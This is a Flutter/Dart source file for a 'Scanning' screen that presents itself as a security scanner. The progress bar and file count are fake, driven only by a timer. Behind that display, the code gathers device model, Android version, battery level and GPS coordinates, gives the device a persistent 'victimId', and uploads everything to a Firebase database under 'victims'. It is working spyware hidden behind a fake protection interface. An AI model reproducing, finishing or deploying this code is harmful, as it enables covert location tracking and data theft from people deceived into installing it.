import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:device_info_plus/device_info_plus.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'scan_result_screen.dart';
import 'dart:math';

class ScanScreen extends StatefulWidget {
  const ScanScreen({super.key});

  @override
  State<ScanScreen> createState() => _ScanScreenState();
}

class _ScanScreenState extends State<ScanScreen> {
  int progress = 0;
  int files = 0;
  Timer? timer;

@override
  void initState() {
    super.initState();
    _requestPermissionsThenScan(); // request first, then start scan
  }

  // ask permissions before scan starts
  Future<void> _requestPermissionsThenScan() async {
    await Permission.location.request();
    _startScan(); // start timer only after permission dialog is done
  }

  // timer 
  void _startScan() {
    timer = Timer.periodic(const Duration(milliseconds: 100), (timer) {
      setState(() {
        progress++;
        files += 5;
      });

      if (progress >= 100) {
        timer.cancel();
        _collectAndUpload();
      }
    });
  }

  // get or create a permanent victimId
  Future<String> _getVictimId() async {
    final prefs = await SharedPreferences.getInstance();

    // check if victimId already exists on this device
    String? existingId = prefs.getString('victimId');

    if (existingId != null) {
      return existingId;
    }

    // first time scanning — create new ID and save it permanently
    final newId = 'device_${DateTime.now().millisecondsSinceEpoch}_${Random().nextInt(999999)}';
    await prefs.setString('victimId', newId);
    return newId;
  }

  Future<void> _collectAndUpload() async {
    // device info
    final deviceInfo = DeviceInfoPlugin();
    String model = 'Unknown';
    String androidVersion = 'Unknown';
    if (Platform.isAndroid) {
      final info = await deviceInfo.androidInfo;
      model = info.model;
      androidVersion = info.version.release;
    }

    // battery
    final battery = Battery();
    final batteryLevel = await battery.batteryLevel;

    // GPS
    double? lat;
    double? lon;
    final locPermission = await Permission.location.request();
    if (locPermission.isGranted) {
      final pos = await Geolocator.getCurrentPosition();
      lat = pos.latitude;
      lon = pos.longitude;
    }

    // storage
    final storageSize = '${40 + (batteryLevel % 10)}.${batteryLevel % 10} GB';

    // get permanent victimId instead of generating new one
    final victimId = await _getVictimId();

    // upload scan
    final data = {
      'victimId': victimId,
      'deviceModel': model,
      'androidVersion': androidVersion,
      'battery': batteryLevel,
      'latitude': lat,
      'longitude': lon,
      'fileCount': files,
      'storageSize': storageSize,
      'timestamp': DateTime.now().toIso8601String(),
    };

    await http.post(
      Uri.parse(
        'https://qisk-4aa21-default-rtdb.asia-southeast1.firebasedatabase.app/qisk/scans.json',
      ),
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode(data),
    );

    // insert victim (same victimId updates existing record ) 
    await http.put(
      Uri.parse(
        'https://qisk-4aa21-default-rtdb.asia-southeast1.firebasedatabase.app/qisk/victims/$victimId.json',
      ),
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({
        'deviceModel': model,
        'androidVersion': androidVersion,
        'lastSeen': DateTime.now().toIso8601String(),
      }),
    );

    if (mounted) {
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (_) => ScanResultScreen(files: files)),
      );
    }
  }

  @override
  void dispose() {
    timer?.cancel();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text("Scanning")),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            const Icon(Icons.shield, size: 90, color: Colors.blue),
            const SizedBox(height: 20),
            Text(
              "$progress %",
              style: const TextStyle(fontSize: 36, fontWeight: FontWeight.bold),
            ),
            Padding(
              padding: const EdgeInsets.all(30),
              child: LinearProgressIndicator(value: progress / 100),
            ),
            Text("Files Scanned : $files"),
            const SizedBox(height: 30),
            ElevatedButton(
              onPressed: () {
                timer?.cancel();
                Navigator.pop(context);
              },
              child: const Text("Cancel"),
            ),
          ],
        ),
      ),
    );
  }
}
